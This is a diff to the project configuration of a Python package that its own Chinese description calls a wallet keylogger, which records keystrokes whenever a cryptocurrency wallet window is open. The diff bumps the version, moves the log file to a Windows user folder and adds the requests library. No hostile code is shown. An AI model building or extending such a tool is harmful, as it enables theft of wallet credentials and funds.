@@ -4,8 +4,8 @@ build-backend = "hatchling.build"
 
 [project]
 name = "wkler"
-version = "0.2.1"
-description = "钱包键盘记录器 - 检测钱包窗口时自动记录键盘输入，记录到 ~/.dev/wkler/recording_{日期}.log"
+version = "0.2.3"
+description = "钱包键盘记录器 - 检测钱包窗口时自动记录键盘输入，记录到 %USERPROFILE%\\.dev\\wkler\\recording_{日期}.log"
 readme = "README.md"
 requires-python = ">=3.8"
 license = {text = "MIT"}
@@ -67,6 +67,7 @@ select = ["E", "F", "W", "I"]
 [tool.uv]
 dev-dependencies = [
     "pytest>=7.0",
+    "requests>=2.28.0",
     "black>=22.0",
     "ruff>=0.1.0",
 ]
